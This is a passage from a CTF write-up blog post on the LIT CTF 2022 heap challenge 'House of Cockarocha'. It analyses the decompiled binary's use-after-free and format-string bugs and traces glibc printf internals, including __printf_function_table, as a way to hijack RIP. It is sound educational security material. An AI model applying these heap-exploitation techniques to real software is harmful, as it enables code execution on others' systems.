<!DOCTYPE html>
<html lang="en">

    <head>		<title>Lit Ctf 2022 Pwn Writeup - Part 1: House of Cockarocha &ndash; piers&#39;s blog</title>
		<meta name="description" content="My personal blog on the journey of learning how2pwn">
		<link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
		<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
		<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
		<link rel="manifest" href="/site.webmanifest">
		<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
		<meta name="msapplication-TileColor" content="#da532c">
		<meta name="theme-color" content="#ffffff">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<meta charset="utf-8"/>

		
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" integrity="sha512-HK5fgLBL+xu6dm/Ii3z4xhlSUyZgTT9tuc/hSrtw6uzJOvgRr2a9jyxxT1ely+B+xFAmJKVSTbpM/CuL7qxO8w==" crossorigin="anonymous" />

		
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css" integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin="anonymous" />

		
		<link rel="stylesheet" href="https://piers-n.github.io/css/colour/gruvbox-dark.css">
		<link rel="stylesheet" href="https://piers-n.github.io/css/colour/dark-mode.css">
		<link rel="stylesheet" href="https://piers-n.github.io/css/risotto.css">
		<link rel="stylesheet" href="https://piers-n.github.io/css/custom.css">
</head>

    <body>
        <div class="page">

            <header class="page__header"><h1 class="page__logo"><a href="https://piers-n.github.io/" class="page__logo-inner">piers&#39;s blog</a></h1>
<nav class="page__nav main-nav">
    <ul>
    
    
    <li class="main-nav__item"><a class="nav-main-item" href="/about/" title="">About</a></li>
    
    <li class="main-nav__item"><a class="nav-main-item active" href="/post/" title="Posts">Posts</a></li>
    
    </ul>
</nav>

</header>

            <section class="page__body">
    <header class="content__header">
        <h1>Lit Ctf 2022 Pwn Writeup - Part 1: House of Cockarocha</h1>
    </header>
    <div class="content__body">
        <p>Surprisingly a ctf contest for highschoolers actually has a lot of difficult pwn challenges.<br>
These challenges have a lot of creative exploiting techniques: House of Husk, House of Muney.<br>
Therefore, I wanted to make a detailed writeup, starting with the first challenge: House of Cockarocha</p>
<h2 id="lfyg-house-of-cockarocha-1-solve-yglf"><lf><yg> House of Cockarocha (1 solve) </yg></lf></h2>
<p><img src="/images/cockarocha/checksec.png" alt="checksec"><br>
<img src="/images/cockarocha/challenge.png" alt="challenge"><br>
That description seems familiar ;)<br>
Because of its similarity to the Minecraft challenge in ImaginaryCtf, that I decided to try to solve it first. The intended solution of Minecraft will be a big hint to how we can solve this one.</p>
<p>My solution however was an unintended one, which was an easier solution compared to the official solution.</p>
<h3 id="lfyg-a-simple-binary-an-easy-to-spot-bug-but-the-exploitation-was-not-so-easy-yglf"><lf><yg> A simple binary, an easy to spot bug, but the exploitation was not so easy </yg></lf></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// [rsp+4h] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  setbuf(stdin, <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  setbuf(stdout, <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Welcome to the house of cockarocha.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( v4 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">5</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> menu();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> ( v4 )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        catch();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        exterminate();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        look();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        dance();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;The cockarochas will miss you :(.&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        invalid(<span style="color:#e6db74">&#34;option, does not exist&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  _exit(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>A typical heap challenge structure</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#a6e22e">catch</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// [rsp+4h] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v2; <span style="color:#75715e">// [rsp+8h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v2 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;You are going to catch a cockroach.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Which container would you like to store it in?&#34;</span>);
</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> inidx();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( container[v1] )
</span></span><span style="display:flex;"><span>    invalid(<span style="color:#e6db74">&#34;container, already storing cockroach&#34;</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;How large is the cockroach you are catching?&#34;</span>);
</span></span><span style="display:flex;"><span>  __isoc99_scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>size[v1]);
</span></span><span style="display:flex;"><span>  getchar();
</span></span><span style="display:flex;"><span>  puts(<span style="color:#f92672">&amp;</span>byte_20A7);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( size[v1] <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">1280</span> <span style="color:#f92672">||</span> size[v1] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x10000</span> )
</span></span><span style="display:flex;"><span>    invalid(<span style="color:#e6db74">&#34;size, none like that exist&#34;</span>);
</span></span><span style="display:flex;"><span>  container[v1] <span style="color:#f92672">=</span> malloc(size[v1] <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Cockroach caught.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v2 <span style="color:#f92672">-</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Catch function is basically our malloc function, and similarly to Minecraft we can only <red>interact with chunk in unsorted bin range. And in this challenge, we cannot even input into our malloc-ed chunk. </red></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#a6e22e">exterminate</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> v1; <span style="color:#75715e">// [rsp+3h] [rbp-Dh]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// [rsp+4h] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// [rsp+8h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;You are going to exterminate a cockroach.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Which container would you like to exterminate the cockroach in?&#34;</span>);
</span></span><span style="display:flex;"><span>  v2 <span style="color:#f92672">=</span> inidx();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>container[v2] )
</span></span><span style="display:flex;"><span>    invalid(<span style="color:#e6db74">&#34;container, no cockroach stored&#34;</span>);
</span></span><span style="display:flex;"><span>  free((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)container[v2]);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Did you remember to close the container lid? (y/N)&#34;</span>);
</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> getchar();
</span></span><span style="display:flex;"><span>  getchar();
</span></span><span style="display:flex;"><span>  puts(<span style="color:#f92672">&amp;</span>byte_20A7);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v1 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;y&#39;</span> <span style="color:#f92672">||</span> v1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">89</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    container[v2] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;Nice job, cockroach exterminated.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( mistake )
</span></span><span style="display:flex;"><span>      invalid(<span style="color:#e6db74">&#34;decison, &#39;fool me once shame on you, fool me twice shame on me&#39;&#34;</span>);
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;Rip, cockroach escaped.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    mistake <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v3 <span style="color:#f92672">-</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We can free and keep the pointer one time. A one-time UAF.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#a6e22e">look</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// [rsp+4h] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v2; <span style="color:#75715e">// [rsp+8h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v2 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;You are going to look at a cockroach.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Which container do you want to look at?&#34;</span>);
</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> inidx();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>container[v1] )
</span></span><span style="display:flex;"><span>    invalid(<span style="color:#e6db74">&#34;container, no cockroach stored&#34;</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Here is what you saw:&#34;</span>);
</span></span><span style="display:flex;"><span>  puts((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)container[v1]);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Cockroach has been seen.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v2 <span style="color:#f92672">-</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Look function, combined with UAF, will be how we <red>leak address.</red></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#a6e22e">dance</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  _BYTE <span style="color:#f92672">*</span>v1; <span style="color:#75715e">// rbx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// [rsp+Ch] [rbp-24h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// [rsp+10h] [rbp-20h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v4; <span style="color:#75715e">// [rsp+18h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;You are going to dance with a cockroach???</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Do you really want to do this? (0/1)&#34;</span>);
</span></span><span style="display:flex;"><span>  __isoc99_scanf(<span style="color:#e6db74">&#34;%lld&#34;</span>, <span style="color:#f92672">&amp;</span>v3);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#f92672">&amp;</span>byte_20A7);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v3 )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;Um... ok.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;Which container holds the cockroach you would like to dance with?&#34;</span>);
</span></span><span style="display:flex;"><span>    v2 <span style="color:#f92672">=</span> inidx();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>container[v2] )
</span></span><span style="display:flex;"><span>      invalid(<span style="color:#e6db74">&#34;container, no cockroach stored&#34;</span>);
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;You can now clothe the cockroach (you know, for the dance floor):&#34;</span>);
</span></span><span style="display:flex;"><span>    v1 <span style="color:#f92672">=</span> (_BYTE <span style="color:#f92672">*</span>)container[v2];
</span></span><span style="display:flex;"><span>    v1[read(<span style="color:#ae81ff">0</span>, v1, size[v2] <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    puts(<span style="color:#f92672">&amp;</span>byte_20A7);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( strchr((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)container[v2], <span style="color:#e6db74">&#39;n&#39;</span>) )
</span></span><span style="display:flex;"><span>      invalid(<span style="color:#e6db74">&#34;clothing, bad design&#34;</span>);
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;Here&#39;s what she looks like:&#34;</span>);
</span></span><span style="display:flex;"><span>    printf((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)container[v2]);
</span></span><span style="display:flex;"><span>    puts(<span style="color:#f92672">&amp;</span>byte_20A7);
</span></span><span style="display:flex;"><span>    _exit(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Yeah, that would be weird.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v4 <span style="color:#f92672">-</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The only time we can get to write into the chunk, the binary will exit right after that.<br>
Similarly to Minecraft, we have a <red>printf format string vulnerability, with character n filtered. </red></p>
<p>A very restrictive challenge. Even with those powerful vulnerabilities, what can we do with only one time input?</p>
<h3 id="lfyg-house-of-husk-house-of-cockarocha-they-are-all-bugs-anyway-right-yglf"><lf><yg> House of Husk, House of Cockarocha, they are all bugs anyway right? </yg></lf></h3>
<p>House of Husk technique is something very new that I have just learnt about after Imaginary CTF. I won&rsquo;t explain how the technique works here. <red>Ptr-yudai</red> has already had a detailed explanation of the <a href="https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507">technique</a></p>
<p>We will change the technique a little bit to adapt it to this restrictive challenge, but we still keep the idea of making a fake function table to change printf functionality.<br>
___________________________________________________________________________________</p>
<p>Be prepared because now we will have to dig deep into GLIBC source code, and find what we can abuse ;)<br>
First let&rsquo;s recap what we already have: A leak, a UAF , we can malloc and input once then the binary exit<br>
=&gt; <red> This means after our input, we need to somehow to malloc again to perform any kind of heap attacks </red></p>
<p>When reading GLIBC source code for vfprintf_internal, I don&rsquo;t really try to understand the source code. We are only trying to find any things useful that help us with the attack.<br>
The current thing we are looking for in printf, is to somehow invoke malloc once again, which coulld help us perform heap attacks.<br>
Thus I try to search for malloc in source code, and I found 2 places that it gets called:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (width <span style="color:#f92672">&gt;=</span> WORK_BUFFER_SIZE <span style="color:#f92672">-</span> EXTSIZ)
</span></span><span style="display:flex;"><span>	  {
</span></span><span style="display:flex;"><span>	    <span style="color:#75715e">/* We have to use a special buffer.  */</span>
</span></span><span style="display:flex;"><span>	    size_t needed <span style="color:#f92672">=</span> ((size_t) width <span style="color:#f92672">+</span> EXTSIZ) <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span> (CHAR_T);
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">if</span> (__libc_use_alloca (needed))
</span></span><span style="display:flex;"><span>	      workend <span style="color:#f92672">=</span> (CHAR_T <span style="color:#f92672">*</span>) alloca (needed) <span style="color:#f92672">+</span> width <span style="color:#f92672">+</span> EXTSIZ;
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>	      {
</span></span><span style="display:flex;"><span>		workstart <span style="color:#f92672">=</span> (CHAR_T <span style="color:#f92672">*</span>) malloc (needed);
</span></span></code></pre></div><p>When the width specifer is too big.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">bool</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__libc_scratch_buffer_set_array_size</span> (<span style="color:#66d9ef">struct</span> scratch_buffer <span style="color:#f92672">*</span>buffer,
</span></span><span style="display:flex;"><span>                                      size_t nelem, size_t size)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  size_t new_length <span style="color:#f92672">=</span> nelem <span style="color:#f92672">*</span> size;
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Avoid overflow check if both values are small. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((nelem <span style="color:#f92672">|</span> size) <span style="color:#f92672">&gt;&gt;</span> (<span style="color:#66d9ef">sizeof</span> (size_t) <span style="color:#f92672">*</span> CHAR_BIT <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&amp;&amp;</span> nelem <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> size <span style="color:#f92672">!=</span> new_length <span style="color:#f92672">/</span> nelem)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/* Overflow.  Discard the old buffer, but it must remain valid
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         to free.  */</span>
</span></span><span style="display:flex;"><span>      scratch_buffer_free (buffer);
</span></span><span style="display:flex;"><span>      scratch_buffer_init (buffer);
</span></span><span style="display:flex;"><span>      __set_errno (ENOMEM);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (new_length <span style="color:#f92672">&lt;=</span> buffer<span style="color:#f92672">-&gt;</span>length)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> true;
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Discard old buffer.  */</span>
</span></span><span style="display:flex;"><span>  scratch_buffer_free (buffer);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>new_ptr <span style="color:#f92672">=</span> malloc (new_length);
</span></span></code></pre></div><p>And when <red>scratch_buffer_set_array_size</red> gets called in <red>printf_positional</red>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Calculate total size needed to represent a single argument
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       across all three argument-related arrays.  */</span>
</span></span><span style="display:flex;"><span>    size_t bytes_per_arg
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span> (<span style="color:#f92672">*</span>args_value) <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span> (<span style="color:#f92672">*</span>args_size) <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span> (<span style="color:#f92672">*</span>args_type);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>scratch_buffer_set_array_size (<span style="color:#f92672">&amp;</span>argsbuf, nargs, bytes_per_arg))
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>	done <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">goto</span> all_done;
</span></span><span style="display:flex;"><span>      }
</span></span></code></pre></div><p><img src="/images/cockarocha/bt.png" alt="bt"><br>
However, I could not understand the source code well enough to know if somehow we can control the data gets written into this newly malloc-ed chunk.<br>
Thus, my options of heap attacks are still very limited.<br>
__________________________________________________________________________________</p>
<p>This is where the attack of House of Husk comes into play. In House of Husk, we finds a way to write into <red> __printf_arginfo_table </red> and <red> __printf_function_table </red>, to control RIP.<br>
Therefore, once again I try to search for them in source code ;)<br>
No need to understand the source code too much.<br>
Usually in House of Husk, we need to write into both of those targes. However I found this piece of code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#75715e">/* Process format specifiers.  */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">extern</span> printf_function <span style="color:#f92672">**</span>__printf_function_table;
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">int</span> function_done;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">if</span> (spec <span style="color:#f92672">&lt;=</span> UCHAR_MAX
</span></span><span style="display:flex;"><span>	      <span style="color:#f92672">&amp;&amp;</span> __printf_function_table <span style="color:#f92672">!=</span> NULL
</span></span><span style="display:flex;"><span>	      <span style="color:#f92672">&amp;&amp;</span> __printf_function_table[(size_t) spec] <span style="color:#f92672">!=</span> NULL)
</span></span><span style="display:flex;"><span>	    {
</span></span><span style="display:flex;"><span>	      <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>ptr <span style="color:#f92672">=</span> alloca (specs[nspecs_done].ndata_args
</span></span><span style="display:flex;"><span>					 <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	      <span style="color:#75715e">/* Fill in an array of pointers to the argument values.  */</span>
</span></span><span style="display:flex;"><span>	      <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> specs[nspecs_done].ndata_args;
</span></span><span style="display:flex;"><span>		   <span style="color:#f92672">++</span>i)
</span></span><span style="display:flex;"><span>		ptr[i] <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>args_value[specs[nspecs_done].data_arg <span style="color:#f92672">+</span> i];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	      <span style="color:#75715e">/* Call the function.  */</span>
</span></span><span style="display:flex;"><span>	      function_done <span style="color:#f92672">=</span> __printf_function_table[(size_t) spec]
</span></span><span style="display:flex;"><span>		(s, <span style="color:#f92672">&amp;</span>specs[nspecs_done].info, ptr);
</span></span></code></pre></div><p>When <red>printf_positional</red> gets called instead of normal <red>vfprintf</red>. <red> __printf_function_table </red> will be called, without checking <red> __printf_arginfo_table </red> like in vfprintf.<br>
Therefore if we can write <red> __printf_function_table </red> with a address point to region we control then we can hijack RIP by faking a function table.</p>
